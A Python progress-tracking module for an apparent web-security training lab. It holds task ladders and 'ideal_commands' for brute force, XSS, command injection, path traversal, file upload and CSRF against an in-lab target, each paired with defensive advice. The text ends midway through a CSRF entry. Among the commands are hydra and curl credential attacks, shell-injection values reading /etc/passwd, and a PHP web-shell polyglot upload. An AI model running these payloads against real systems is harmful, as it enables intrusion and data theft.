"""
backend/lab_progress.py — Computes mission progress from target-agent events.

Pulls events from `target-agent:/lab/events?since=...` and matches them
against per-module success criteria. Also includes tool command evidence
from lab mode (AttackBox). Returns a structured response the
LearningPanel renders directly.

Modes:
  tutorial — all evidence counts; rich explanations for each task
  lab      — only via="attackbox" evidence counts; requires real tool usage
"""
from __future__ import annotations

import os
import time
from typing import Any, Dict, List, Optional

import urllib.request
import urllib.error
import json

# Where to reach the target-agent's evidence API. In docker-compose,
# resolved by service hostname.
TARGET_AGENT_URL = os.getenv("LAB_EVENTS_URL", "http://target-agent")


def fetch_events(since: float = 0.0,
                 module_id: Optional[str] = None,
                 limit: int = 500) -> List[Dict[str, Any]]:
    """Fetch raw events from target-agent. Returns [] on any error."""
    qs = f"since={since}&limit={limit}"
    if module_id:
        qs += f"&module_id={module_id}"
    url = f"{TARGET_AGENT_URL}/lab/events?{qs}"
    try:
        with urllib.request.urlopen(url, timeout=4) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return data.get("events", [])
    except (urllib.error.URLError, urllib.error.HTTPError, ValueError, OSError):
        return []


# ── Per-module success specs ────────────────────────────────────────────────
# Each module has two task ladders:
#   tasks_tutorial — for tutorial mode (any evidence channel, rich explanations)
#   tasks_lab      — for lab mode (AttackBox/ZAP only, stricter requirements)
#
# success_tutorial / success_lab list event_types that must ALL be observed
# for the mission to be flagged as fully successful.
PROGRESS_SPECS: Dict[str, Dict[str, Any]] = {
    "recon": {
        "tasks_tutorial": [
            {
                "title":  "Visit the target portal",
                "event_types": ["portal_visited"],
                "explain": "Open the target home page in the lab browser.",
            },
            {
                "title":  "Explore at least 3 application areas",
                "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "file_upload_used", "profile_update_used"],
                "min_count": 3,
                "explain": "Click around the portal — visit the search, profile, files, system pages.",
            },
            {
                "title":  "Discover a hidden lab clue",
                "event_types": ["hidden_clue_accessed", "csrf_lure_visited"],
                "explain": "Find a non-obvious route in the app (try /robots.txt or /.well-known/security.txt).",
            },
            {
                "title":  "Trigger recon sequence detection",
                "event_types": ["recon_sequence_observed"],
                "explain": "Visit 4+ distinct areas of the portal to trigger this synthetic event.",
            },
        ],
        "tasks_lab": [
            {
                "title":  "Fingerprint the target with curl",
                "event_types": ["portal_visited"],
                "explain": "From AttackBox: `curl -i http://target-agent/` — note the server banner.",
            },
            {
                "title":  "Map at least 4 endpoints from the terminal",
                "event_types": ["route_discovered", "search_used", "diagnostics_used", "file_viewer_used", "file_upload_used", "profile_update_used"],
                "min_count": 4,
                "explain": "Use curl to hit /search, /system/ping, /files/read, /profile/. Browser clicks do NOT count.",
            },
            {
                "title":  "Discover the hidden lab clue",
                "event_types": ["hidden_clue_accessed", "csrf_lure_visited"],
                "explain": "Curl /robots.txt or guess /evil/csrf-demo. Read response carefully.",
            },
            {
                "title":  "Trigger recon sequence detection",
                "event_types": ["recon_sequence_observed"],
                "explain": "After visiting 4+ areas via AttackBox, this synthetic event fires.",
            },
        ],
        "success_tutorial": ["portal_visited", "recon_sequence_observed"],
        "success_lab":      ["recon_sequence_observed"],
        "defensive_insight":
            "Hide internal route maps from public landing pages. Keep server "
            "version banners out of HTML comments and response headers.",
    },

    "brute_force": {
        "tasks_tutorial": [
            {
                "title": "Use the login form at /auth/login",
                "event_types": ["login_failed", "login_success"],
                "explain": "Submit the login form to interact with the vulnerable endpoint.",
            },
            {
                "title": "Trigger multiple failed logins",
                "event_types": ["brute_force_pattern"],
                "explain": "3+ failed attempts from your IP within 5 minutes triggers this.",
            },
            {
                "title": "Find a valid credential",
                "event_types": ["credential_found"],
                "explain": "Successfully log in to confirm a working username/password pair.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Probe the login endpoint with curl",
                "event_types": ["login_failed", "login_success"],
                "min_count": 1,
                "explain": "Send the first POST from the AttackBox terminal to confirm the endpoint responds.",
            },
            {
                "title": "Run a wordlist attack from the AttackBox",
                "event_types": ["login_failed"],
                "min_count": 6,
                "explain": "Drive 6+ login attempts via curl/hydra. Browser clicks do NOT count.",
            },
            {
                "title": "Trigger the brute-force pattern detection",
                "event_types": ["brute_force_pattern"],
                "explain": "After repeated AttackBox failures, the pattern event fires.",
            },
            {
                "title": "Confirm a valid credential by hand",
                "event_types": ["credential_found"],
                "explain": "Use curl with the credential found by hydra to confirm a 302 redirect to /profile/.",
            },
        ],
        "success_tutorial": ["brute_force_pattern", "credential_found"],
        "success_lab":      ["brute_force_pattern", "credential_found"],
        "defensive_insight":
            "Add per-account and per-IP rate limiting, account lockout after "
            "5 failures, and detection rules for repeated 401 responses.",
    },

    "xss": {
        "tasks_tutorial": [
            {
                "title": "Use the search form",
                "event_types": ["search_used"],
                "explain": "Submit any query to interact with the reflective endpoint.",
            },
            {
                "title": "Submit a script-like payload",
                "event_types": ["xss_payload_observed"],
                "explain": "Try things like <script>alert(1)</script> or onerror= handlers.",
            },
            {
                "title": "Confirm reflection without escaping",
                "event_types": ["reflected_input_detected"],
                "explain": "When XSS-shaped input is reflected unescaped, this fires.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Inspect the search endpoint via curl",
                "event_types": ["search_used"],
                "min_count": 1,
                "explain": "From AttackBox: curl 'http://target-agent/search?q=hello' — observe the reflection.",
            },
            {
                "title": "Submit at least 2 XSS-shaped payloads",
                "event_types": ["xss_payload_observed"],
                "min_count": 2,
                "explain": "Use curl with --data-urlencode to test <script>, <img onerror>, <svg onload>.",
            },
            {
                "title": "Confirm unescaped reflection",
                "event_types": ["reflected_input_detected"],
                "explain": "Verify your payload is reflected verbatim — no encoding applied.",
            },
        ],
        "success_tutorial": ["xss_payload_observed", "reflected_input_detected"],
        "success_lab":      ["xss_payload_observed", "reflected_input_detected"],
        "defensive_insight":
            "Encode untrusted output before rendering it into HTML. Use a "
            "templating engine with autoescape ON. Add a CSP that blocks inline scripts.",
    },

    "cmd_injection": {
        "tasks_tutorial": [
            {
                "title": "Use the diagnostics ping form",
                "event_types": ["diagnostics_used"],
                "explain": "Submit a host value to /system/ping.",
            },
            {
                "title": "Submit shell separator characters",
                "event_types": ["command_separator_observed"],
                "explain": "Try host values like 127.0.0.1; id  or  127.0.0.1 && whoami.",
            },
            {
                "title": "Confirm command injection",
                "event_types": ["command_injection_detected"],
                "explain": "Output that includes uid=, root:, or /bin/* indicators.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Probe the ping endpoint with curl",
                "event_types": ["diagnostics_used"],
                "min_count": 1,
                "explain": "curl 'http://target-agent/system/ping?host=127.0.0.1' to verify normal behaviour.",
            },
            {
                "title": "Test 2+ shell metacharacters",
                "event_types": ["command_separator_observed"],
                "min_count": 2,
                "explain": "Try ; | && $() with curl --data-urlencode. Find which separators get through.",
            },
            {
                "title": "Confirm RCE with system command output",
                "event_types": ["command_injection_detected"],
                "explain": "Inject `id` or `cat /etc/passwd` and confirm the output appears in the response.",
            },
        ],
        "success_tutorial": ["command_injection_detected"],
        "success_lab":      ["command_injection_detected"],
        "defensive_insight":
            "Never pass user input to shell commands. Use parameterized "
            "system calls (subprocess with a list and shell=False) or a strict "
            "allowlist of legal hostnames.",
    },

    "dir_traversal": {
        "tasks_tutorial": [
            {
                "title": "Use the file viewer",
                "event_types": ["file_viewer_used"],
                "explain": "Open /files/read?path=readme.txt.",
            },
            {
                "title": "Submit a path-traversal sequence",
                "event_types": ["traversal_pattern_observed"],
                "explain": "Try ../../etc/passwd in the path field.",
            },
            {
                "title": "Disclose a sensitive file",
                "event_types": ["sensitive_file_disclosed"],
                "explain": "When response content includes root:, /bin/, etc.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Probe the file viewer with curl",
                "event_types": ["file_viewer_used"],
                "min_count": 1,
                "explain": "curl 'http://target-agent/files/read?path=readme.txt' to confirm normal behaviour.",
            },
            {
                "title": "Test 2+ traversal payloads",
                "event_types": ["traversal_pattern_observed"],
                "min_count": 2,
                "explain": "Try ../../etc/passwd, ../../../../etc/passwd, URL-encoded variants.",
            },
            {
                "title": "Disclose a sensitive system file",
                "event_types": ["sensitive_file_disclosed"],
                "explain": "Read /etc/passwd or /etc/hosts via the traversal payload.",
            },
        ],
        "success_tutorial": ["sensitive_file_disclosed"],
        "success_lab":      ["sensitive_file_disclosed"],
        "defensive_insight":
            "Normalize paths with os.path.realpath and verify the resolved "
            "path stays inside the intended base directory before opening.",
    },

    "file_upload": {
        "tasks_tutorial": [
            {
                "title": "Use the upload form",
                "event_types": ["file_upload_used"],
                "explain": "Submit any file via /files/upload.",
            },
            {
                "title": "Successfully save a file",
                "event_types": ["file_saved"],
                "explain": "An uploaded file lands in /app/static/uploads/.",
            },
            {
                "title": "Upload a dangerous file extension",
                "event_types": ["dangerous_extension_accepted", "unrestricted_upload_detected"],
                "explain": "Upload a .php / .jsp / .sh / .html file — it is accepted.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Inspect the upload endpoint with curl",
                "event_types": ["file_upload_used"],
                "min_count": 1,
                "explain": "curl -F 'file=@/etc/hostname' http://target-agent/files/upload",
            },
            {
                "title": "Save 2+ files via the AttackBox",
                "event_types": ["file_saved"],
                "min_count": 2,
                "explain": "Upload several distinct filenames to confirm there is no rate limit.",
            },
            {
                "title": "Upload a dangerous extension",
                "event_types": ["dangerous_extension_accepted", "unrestricted_upload_detected"],
                "explain": "Upload shell.php or runme.sh — confirm the server stores it without rejecting.",
            },
        ],
        "success_tutorial": ["unrestricted_upload_detected"],
        "success_lab":      ["unrestricted_upload_detected"],
        "defensive_insight":
            "Validate by file content (magic bytes), enforce an allowlist of "
            "extensions, and never serve uploads from a path that gets executed "
            "by the application server.",
    },

    "csrf": {
        "tasks_tutorial": [
            {
                "title": "Visit the profile page",
                "event_types": ["profile_update_used", "route_discovered"],
                "explain": "Open /profile/ to see a state-changing form.",
            },
            {
                "title": "Open the CSRF demo lure page",
                "event_types": ["csrf_lure_visited"],
                "explain": "Visit /evil/csrf-demo while logged in.",
            },
            {
                "title": "Submit forged update without a token",
                "event_types": [
                    "csrf_lure_submitted",
                    "profile_changed_without_csrf",
                    "csrf_token_missing",
                ],
                "explain": "Click the lure button — the profile email changes silently.",
            },
        ],
        "tasks_lab": [
            {
                "title": "Authenticate with curl and capture the cookie",
                "event_types": ["login_success"],
                "min_count": 1,
                "explain": "curl -c cookies.txt -d 'username=admin&password=password123' http://target-agent/auth/login",
            },
            {
                "title": "Inspect the profile-update endpoint",
                "event_types": ["profile_update_used"],
                "min_count": 1,
                "explain": "GET /profile/ with curl -b cookies.txt — confirm there's no CSRF token field.",
            },
            {
                "title": "Forge a state-changing POST without a token",
                "event_types": [
                    "csrf_token_missing",
                    "profile_changed_without_csrf",
                ],
                "explain": "curl -b cookies.txt -d 'email=pwned@evil' http://target-agent/profile/update",
            },
        ],
        "success_tutorial": ["profile_changed_without_csrf"],
        "success_lab":      ["profile_changed_without_csrf"],
        "defensive_insight":
            "Require a CSRF token on every state-changing form, validate the "
            "Origin/Referer header, and use SameSite=Strict cookies.",
    },
}


# ═══════════════════════════════════════════════════════════════════════════
#  MODULE VARIANTS — Each module supports multiple attack flavours.
#  The learner picks one when starting a mission.  At progress-compute time
#  the variant's task ladder REPLACES the default tasks_tutorial / tasks_lab
#  for that module, and the variant-specific success markers REPLACE the
#  default ones.  The rest of the spec (defensive_insight etc.) is reused.
#
#  Each variant entry:
#    name         — human-readable name shown in the variant picker
#    description  — 1-2 sentences shown under the radio button
#    difficulty   — "Easy" | "Medium" | "Hard"
#    techniques   — short list of techniques used (informational)
#    tasks        — list of task dicts (same shape as PROGRESS_SPECS.tasks_lab)
#    success_event_types — events that must ALL fire for success
#    ideal_commands — list of literal commands the operator should run
#                     (used by the Report agent for "ideal approach" coaching)
# ═══════════════════════════════════════════════════════════════════════════
MODULE_VARIANTS: Dict[str, Dict[str, Dict[str, Any]]] = {

    # ─── BRUTE FORCE ────────────────────────────────────────────────────
    "brute_force": {
        "password_spray": {
            "name":        "Password Spraying",
            "description": "Try ONE common password across MANY usernames. Evades per-account lockout.",
            "difficulty":  "Easy",
            "techniques":  ["enumeration", "low-and-slow", "single-password"],
            "tasks": [
                {"title": "Enumerate likely usernames",
                 "event_types": ["login_failed", "login_success"],
                 "min_count": 4,
                 "explain":     "Submit 4+ different usernames with the same trial password."},
                {"title": "Detect username enumeration leak",
                 "event_types": ["login_failed"],
                 "min_count": 6,
                 "explain":     "Compare error messages between known and unknown users."},
                {"title": "Trigger pattern detection",
                 "event_types": ["brute_force_pattern"],
                 "explain":     "After 3+ failures from your IP the pattern event fires."},
                {"title": "Discover a working credential",
                 "event_types": ["credential_found"],
                 "explain":     "One of the candidate usernames will share the spray password."},
            ],
            "success_event_types": ["brute_force_pattern", "credential_found"],
            "ideal_commands": [
                "# Build a username list (top 6 common admin names)",
                "printf 'admin\\noperator\\nguest\\nalice\\nbob\\nservice\\n' > /lab/users.txt",
                "# Spray a single common password across all users",
                "for u in $(cat /lab/users.txt); do",
                "  curl -s -o /dev/null -w '%{http_code} '$u'\\n' \\",
                "       -X POST http://target-agent/auth/login \\",
                "       -d \"username=$u&password=password123\"",
                "done",
                "# Successful spray: one user returns 302 (redirect to /profile/)",
            ],
        },
        "credential_stuffing": {
            "name":        "Credential Stuffing",
            "description": "Reuse leaked password lists against known accounts. Tests password reuse.",
            "difficulty":  "Medium",
            "techniques":  ["leaked-wordlist", "multi-password", "known-username"],
            "tasks": [
                {"title": "Confirm endpoint accepts repeated POSTs",
                 "event_types": ["login_failed"],
                 "min_count": 1,
                 "explain":     "Send one POST to /auth/login to verify the form."},
                {"title": "Stuff a known username with a leaked wordlist",
                 "event_types": ["login_failed"],
                 "min_count": 8,
                 "explain":     "Loop 8+ leaked passwords against username 'admin'."},
                {"title": "Trigger brute-force pattern detection",
                 "event_types": ["brute_force_pattern"],
                 "explain":     "Wazuh-style detection fires after 3+ failures in 5 min."},
                {"title": "Credential found in the leaked list",
                 "event_types": ["credential_found"],
                 "explain":     "The lab passwords contain the planted credential."},
            ],
            "success_event_types": ["brute_force_pattern", "credential_found"],
            "ideal_commands": [
                "# Use a leaked-password mini wordlist (preinstalled in AttackBox)",
                "WORDS=/wordlists/rockyou-mini.txt",
                "# Hammer username=admin with each password",
                "while read -r pw; do",
                "  curl -s -o /dev/null -w '%{http_code} '$pw'\\n' \\",
                "       -X POST http://target-agent/auth/login \\",
                "       -d \"username=admin&password=$pw\"",
                "done < $WORDS | grep '^302'",
            ],
        },
        "hydra_targeted": {
            "name":        "Targeted Hydra Attack",
            "description": "Form-aware brute force using hydra with a curated wordlist. Hardest.",
            "difficulty":  "Hard",
            "techniques":  ["hydra", "form-template", "parallel-threads"],
            "tasks": [
                {"title": "Inspect the login form structure",
                 "event_types": ["login_failed"],
                 "min_count": 1,
                 "explain":     "GET /auth/login and identify the action URL + field names."},
                {"title": "Build a smart wordlist matched to the company",
                 "event_types": ["login_failed"],
                 "min_count": 10,
                 "explain":     "Hydra will probe 10+ password candidates against multiple users."},
                {"title": "Trigger brute-force pattern detection",
                 "event_types": ["brute_force_pattern"],
                 "explain":     "Mass parallel attempts trip the pattern detector instantly."},
                {"title": "Hydra reports a valid credential",
                 "event_types": ["credential_found"],
                 "explain":     "Hydra's -f flag stops on first hit and prints user:pass."},
            ],
            "success_event_types": ["brute_force_pattern", "credential_found"],
            "ideal_commands": [
                "# Hydra form-template: path:body:failure-string",
                "hydra -L /lab/users.txt -P /wordlists/rockyou-mini.txt \\",
                "      target-agent http-post-form \\",
                "      '/auth/login:username=^USER^&password=^PASS^:Incorrect password|Account not found' \\",
                "      -t 8 -f",
                "# Verify the credential by hand",
                "curl -i -X POST http://target-agent/auth/login \\",
                "     -d 'username=admin&password=password123'   # → 302 /profile/",
            ],
        },
    },

    # ─── XSS ────────────────────────────────────────────────────────────
    "xss": {
        "reflected": {
            "name":        "Reflected XSS",
            "description": "Single-request injection — payload bounces back in the response.",
            "difficulty":  "Easy",
            "techniques":  ["reflection", "script-tag", "url-parameter"],
            "tasks": [
                {"title": "Submit a benign query to confirm reflection",
                 "event_types": ["search_used"], "min_count": 1,
                 "explain": "GET /search?q=hello — confirm 'hello' appears in the response body."},
                {"title": "Inject a script-style payload",
                 "event_types": ["xss_payload_observed"], "min_count": 1,
                 "explain": "Try <script>alert(1)</script>"},
                {"title": "Confirm the payload renders unescaped",
                 "event_types": ["reflected_input_detected"],
                 "explain": "The response includes the raw script tag — verbatim."},
            ],
            "success_event_types": ["xss_payload_observed", "reflected_input_detected"],
            "ideal_commands": [
                "curl -s --data-urlencode 'q=<script>alert(1)</script>' -G \\",
                "     http://target-agent/search | grep -oE '<script[^<]*</script>'",
                "# Expected:  <script>alert(1)</script>  (verbatim = unescaped)",
            ],
        },
        "alternate_context": {
            "name":        "Alternate XSS Contexts",
            "description": "Bypass script-tag blocklists with event handlers and SVG/IMG vectors.",
            "difficulty":  "Medium",
            "techniques":  ["event-handler", "svg-onload", "img-onerror"],
            "tasks": [
                {"title": "Confirm baseline reflection",
                 "event_types": ["search_used"], "min_count": 1,
                 "explain": "GET /search?q=test"},
                {"title": "Submit 3 distinct payload contexts",
                 "event_types": ["xss_payload_observed"], "min_count": 3,
                 "explain": "<img onerror>, <svg onload>, javascript: URL — each is a different filter bypass."},
                {"title": "Confirm at least one unescaped reflection",
                 "event_types": ["reflected_input_detected"],
                 "explain": "If <script> is filtered, event handlers often slip through."},
            ],
            "success_event_types": ["xss_payload_observed", "reflected_input_detected"],
            "ideal_commands": [
                "for payload in '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>' '\"><script>alert(1)</script>'; do",
                "  echo \"=== $payload ===\"",
                "  curl -s -G --data-urlencode \"q=$payload\" http://target-agent/search | grep -oE '<(img|svg|script)[^>]*>'",
                "done",
            ],
        },
        "stored_attempt": {
            "name":        "Stored XSS Probe",
            "description": "Save a payload via the profile bio field — see if it persists. (Harder.)",
            "difficulty":  "Hard",
            "techniques":  ["persistence", "profile-update", "double-trigger"],
            "tasks": [
                {"title": "Authenticate so the profile is editable",
                 "event_types": ["login_success"], "min_count": 1,
                 "explain": "POST /auth/login with valid credentials."},
                {"title": "Submit a payload through the profile bio",
                 "event_types": ["xss_payload_observed", "profile_update_used"], "min_count": 2,
                 "explain": "POST /profile/update with email or bio containing a script tag."},
                {"title": "Verify the payload reflects on a SECOND request",
                 "event_types": ["reflected_input_detected"],
                 "explain": "Reload /profile/ and confirm the payload is still there."},
            ],
            "success_event_types": ["xss_payload_observed", "reflected_input_detected"],
            "ideal_commands": [
                "# 1. Login and save cookie",
                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login \\",
                "     -d 'username=admin&password=password123' >/dev/null",
                "# 2. Update profile email with a payload",
                "curl -b /tmp/c.txt -s -X POST http://target-agent/profile/update \\",
                "     --data-urlencode 'email=<script>alert(1)</script>@evil.lab'",
                "# 3. Re-read profile — payload appears unescaped",
                "curl -b /tmp/c.txt -s http://target-agent/profile/ | grep -oE '<script[^<]*</script>'",
            ],
        },
    },

    # ─── COMMAND INJECTION ──────────────────────────────────────────────
    "cmd_injection": {
        "semicolon_basic": {
            "name":        "Semicolon Chaining",
            "description": "Classic shell-injection: append a second command with ;.",
            "difficulty":  "Easy",
            "techniques":  ["semicolon", "command-chaining"],
            "tasks": [
                {"title": "Confirm the ping endpoint works",
                 "event_types": ["diagnostics_used"], "min_count": 1,
                 "explain": "GET /system/ping?host=127.0.0.1"},
                {"title": "Submit a semicolon-chained payload",
                 "event_types": ["command_separator_observed"], "min_count": 1,
                 "explain": "host=127.0.0.1; id"},
                {"title": "Confirm the injected command ran",
                 "event_types": ["command_injection_detected"],
                 "explain": "Output contains 'uid=' or '/etc/' indicators."},
            ],
            "success_event_types": ["command_injection_detected"],
            "ideal_commands": [
                "curl -s -G --data-urlencode 'host=127.0.0.1; id' \\",
                "     http://target-agent/system/ping | grep -oE 'uid=[^ ]+'",
                "# Expected:  uid=0(root)",
            ],
        },
        "pipe_redirect": {
            "name":        "Pipe & Redirect",
            "description": "Bypass semicolon filters using | and > characters.",
            "difficulty":  "Medium",
            "techniques":  ["pipe", "redirect", "filter-bypass"],
            "tasks": [
                {"title": "Probe the endpoint",
                 "event_types": ["diagnostics_used"], "min_count": 1,
                 "explain": "GET /system/ping?host=127.0.0.1"},
                {"title": "Test 2+ alternative separators",
                 "event_types": ["command_separator_observed"], "min_count": 2,
                 "explain": "Try host=127.0.0.1|whoami, host=127.0.0.1>/tmp/out.txt"},
                {"title": "Confirm RCE through pipe",
                 "event_types": ["command_injection_detected"],
                 "explain": "Pipe output reveals system info."},
            ],
            "success_event_types": ["command_injection_detected"],
            "ideal_commands": [
                "curl -s -G --data-urlencode 'host=127.0.0.1|whoami' http://target-agent/system/ping",
                "curl -s -G --data-urlencode 'host=127.0.0.1 && cat /etc/hostname' http://target-agent/system/ping",
            ],
        },
        "subshell": {
            "name":        "Subshell Substitution",
            "description": "Use $() or backticks to inject output. Stealthy — no obvious separator.",
            "difficulty":  "Hard",
            "techniques":  ["subshell", "backtick", "dollar-paren"],
            "tasks": [
                {"title": "Confirm baseline",
                 "event_types": ["diagnostics_used"], "min_count": 1,
                 "explain": "GET /system/ping?host=127.0.0.1"},
                {"title": "Inject via $(...) or `...`",
                 "event_types": ["command_separator_observed"], "min_count": 2,
                 "explain": "host=$(id), host=`whoami`"},
                {"title": "Confirm subshell output reached you",
                 "event_types": ["command_injection_detected"],
                 "explain": "Response shows command output substituted into ping target."},
            ],
            "success_event_types": ["command_injection_detected"],
            "ideal_commands": [
                "curl -s -G --data-urlencode 'host=$(id)' http://target-agent/system/ping | head -5",
                "curl -s -G --data-urlencode 'host=`cat /etc/passwd | head -1`' http://target-agent/system/ping",
            ],
        },
    },

    # ─── DIR TRAVERSAL ──────────────────────────────────────────────────
    "dir_traversal": {
        "plain": {
            "name":        "Plain ../",
            "description": "Vanilla path traversal — no encoding, no tricks.",
            "difficulty":  "Easy",
            "techniques":  ["dotdotslash", "relative-path"],
            "tasks": [
                {"title": "Probe the file viewer",
                 "event_types": ["file_viewer_used"], "min_count": 1,
                 "explain": "GET /files/read?path=readme.txt"},
                {"title": "Submit a traversal sequence",
                 "event_types": ["traversal_pattern_observed"], "min_count": 1,
                 "explain": "path=../../etc/passwd"},
                {"title": "Read a sensitive system file",
                 "event_types": ["sensitive_file_disclosed"],
                 "explain": "Response contains 'root:' or '/bin/bash'."},
            ],
            "success_event_types": ["sensitive_file_disclosed"],
            "ideal_commands": [
                "curl -s 'http://target-agent/files/read?path=../../etc/passwd' | grep -E '^root:'",
            ],
        },
        "encoded": {
            "name":        "URL-Encoded Traversal",
            "description": "Bypass simple string filters with %2e and %2f.",
            "difficulty":  "Medium",
            "techniques":  ["url-encoding", "filter-bypass"],
            "tasks": [
                {"title": "Probe the viewer",
                 "event_types": ["file_viewer_used"], "min_count": 1,
                 "explain": "GET /files/read?path=readme.txt"},
                {"title": "Submit 2+ encoded traversal variants",
                 "event_types": ["traversal_pattern_observed"], "min_count": 2,
                 "explain": "%2e%2e%2fetc%2fpasswd, also try %252e%252e for double-encoding."},
                {"title": "Disclose a sensitive file",
                 "event_types": ["sensitive_file_disclosed"],
                 "explain": "Response includes /etc/passwd content."},
            ],
            "success_event_types": ["sensitive_file_disclosed"],
            "ideal_commands": [
                "curl -s 'http://target-agent/files/read?path=..%2F..%2Fetc%2Fpasswd' | head",
                "curl -s 'http://target-agent/files/read?path=%252E%252E%252Fetc%252Fpasswd' | head",
            ],
        },
        "absolute": {
            "name":        "Absolute Path",
            "description": "Skip the traversal — just send /etc/passwd directly.",
            "difficulty":  "Hard",
            "techniques":  ["absolute-path", "null-byte"],
            "tasks": [
                {"title": "Probe the viewer",
                 "event_types": ["file_viewer_used"], "min_count": 1,
                 "explain": "GET /files/read?path=readme.txt"},
                {"title": "Submit an absolute path",
                 "event_types": ["traversal_pattern_observed"], "min_count": 1,
                 "explain": "path=/etc/passwd (no dot-dot)."},
                {"title": "Disclose sensitive file via absolute path",
                 "event_types": ["sensitive_file_disclosed"],
                 "explain": "Some apps strip ../ but accept absolute paths."},
            ],
            "success_event_types": ["sensitive_file_disclosed"],
            "ideal_commands": [
                "curl -s 'http://target-agent/files/read?path=/etc/passwd' | grep -E '^root:'",
                "curl -s 'http://target-agent/files/read?path=/etc/hostname'",
            ],
        },
    },

    # ─── FILE UPLOAD ────────────────────────────────────────────────────
    "file_upload": {
        "wrong_extension": {
            "name":        "Dangerous Extension",
            "description": "Upload a .php or .sh file — the simplest test of upload validation.",
            "difficulty":  "Easy",
            "techniques":  ["extension-bypass"],
            "tasks": [
                {"title": "Submit a benign file",
                 "event_types": ["file_upload_used", "file_saved"], "min_count": 2,
                 "explain": "Upload probe.txt to confirm the endpoint works."},
                {"title": "Upload a .php file",
                 "event_types": ["dangerous_extension_accepted"], "min_count": 1,
                 "explain": "Upload shell.php — confirm the server stores it."},
                {"title": "Confirm unrestricted upload",
                 "event_types": ["unrestricted_upload_detected"],
                 "explain": "Server returns a path under /static/uploads/."},
            ],
            "success_event_types": ["unrestricted_upload_detected"],
            "ideal_commands": [
                "echo 'hello' > /tmp/probe.txt && curl -F 'file=@/tmp/probe.txt' http://target-agent/files/upload",
                "echo '<?php echo \"x\"; ?>' > /tmp/shell.php",
                "curl -F 'file=@/tmp/shell.php' http://target-agent/files/upload",
            ],
        },
        "mime_spoof": {
            "name":        "MIME Type Spoofing",
            "description": "Lie about the file type via Content-Type header.",
            "difficulty":  "Medium",
            "techniques":  ["mime-confusion", "content-type-bypass"],
            "tasks": [
                {"title": "Upload a normal image",
                 "event_types": ["file_saved"], "min_count": 1,
                 "explain": "Upload a real image to confirm baseline."},
                {"title": "Upload a .php disguised as image/png",
                 "event_types": ["dangerous_extension_accepted"], "min_count": 1,
                 "explain": "curl -F 'file=@shell.php;type=image/png' — see if server trusts the header."},
                {"title": "Confirm unrestricted upload",
                 "event_types": ["unrestricted_upload_detected"],
                 "explain": "Server returns a path — MIME wasn't enforced."},
            ],
            "success_event_types": ["unrestricted_upload_detected"],
            "ideal_commands": [
                "echo '<?php phpinfo(); ?>' > /tmp/shell.php",
                "curl -F 'file=@/tmp/shell.php;type=image/png' http://target-agent/files/upload",
            ],
        },
        "polyglot": {
            "name":        "Polyglot File",
            "description": "Valid image AND valid script in the same file. Bypasses content-sniffing.",
            "difficulty":  "Hard",
            "techniques":  ["polyglot", "magic-bytes", "double-format"],
            "tasks": [
                {"title": "Upload a baseline file",
                 "event_types": ["file_saved"], "min_count": 1,
                 "explain": "Confirm the endpoint accepts uploads."},
                {"title": "Upload a polyglot (.jpg.php)",
                 "event_types": ["dangerous_extension_accepted"], "min_count": 1,
                 "explain": "Prepend JPEG magic bytes to a PHP payload, save as .jpg.php"},
                {"title": "Confirm unrestricted upload",
                 "event_types": ["unrestricted_upload_detected"],
                 "explain": "Both content sniffing AND extension check fail."},
            ],
            "success_event_types": ["unrestricted_upload_detected"],
            "ideal_commands": [
                "# Build a polyglot: JPEG header + PHP payload",
                "printf '\\xff\\xd8\\xff\\xe0' > /tmp/poly.jpg.php",
                "echo '<?php system($_GET[\"c\"]); ?>' >> /tmp/poly.jpg.php",
                "curl -F 'file=@/tmp/poly.jpg.php;type=image/jpeg' http://target-agent/files/upload",
            ],
        },
    },

    # ─── CSRF ───────────────────────────────────────────────────────────
    "csrf": {
        "basic_forgery": {
            "name":        "Basic Forgery",
            "description": "Submit a state-changing POST without a CSRF token from any origin.",
            "difficulty":  "Easy",
            "techniques":  ["missing-token", "post-forgery"],
            "tasks": [
                {"title": "Login and capture cookie",
                 "event_types": ["login_success"], "min_count": 1,
                 "explain": "POST /auth/login with valid creds, save cookies."},
                {"title": "Submit /profile/update without a token",
                 "event_types": ["profile_update_used", "csrf_token_missing"], "min_count": 2,
                 "explain": "POST -d 'email=pwned@evil.lab' with the cookie."},
                {"title": "Confirm profile was changed",
                 "event_types": ["profile_changed_without_csrf"],
                 "explain": "GET /profile/ shows the new email."},
            ],
            "success_event_types": ["profile_changed_without_csrf"],
            "ideal_commands": [
                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login \\",
                "     -d 'username=admin&password=password123' >/dev/null",
                "curl -b /tmp/c.txt -s -X POST http://target-agent/profile/update \\",
                "     -d 'email=pwned@evil.lab' -o /dev/null -w 'HTTP %{http_code}\\n'",
                "curl -b /tmp/c.txt -s http://target-agent/profile/ | grep -oE 'pwned@evil[^<]*'",
            ],
        },
        "lure_page": {
            "name":        "Attacker Lure Page",
            "description": "Use the /evil/csrf-demo lure — simulates a real cross-site attack.",
            "difficulty":  "Medium",
            "techniques":  ["lure-page", "auto-submit", "referer-spoof"],
            "tasks": [
                {"title": "Login as victim",
                 "event_types": ["login_success"], "min_count": 1,
                 "explain": "Authenticate as admin."},
                {"title": "Visit the attacker lure page",
                 "event_types": ["csrf_lure_visited"], "min_count": 1,
                 "explain": "GET /evil/csrf-demo (the in-lab attacker page)."},
                {"title": "Confirm the forged update succeeded",
                 "event_types": ["csrf_lure_submitted", "profile_changed_without_csrf"], "min_count": 2,
                 "explain": "The lure auto-submits — profile email changes silently."},
            ],
            "success_event_types": ["csrf_lure_submitted", "profile_changed_without_csrf"],
            "ideal_commands": [
                "# Login as victim",
                "curl -c /tmp/c.txt -s -X POST http://target-agent/auth/login -d 'username=admin&password=password123' >/dev/null",
                "# Simulate clicking the lure (sends Referer: /evil/csrf-demo)",
                "curl -b /tmp/c.txt -s -e 'http://target-agent/evil/csrf-demo' \\",
                "     -X POST http://target-agent/profile/update \\",
                "     -d 'email=hacked@evil.lab'",
            ],
        },
        "json_bypass": {
            "name":        "Content-Type Bypass",
            "description": "Send the request as JSON — many anti-CSRF filters only check form posts.",
            "difficulty":  "Hard",
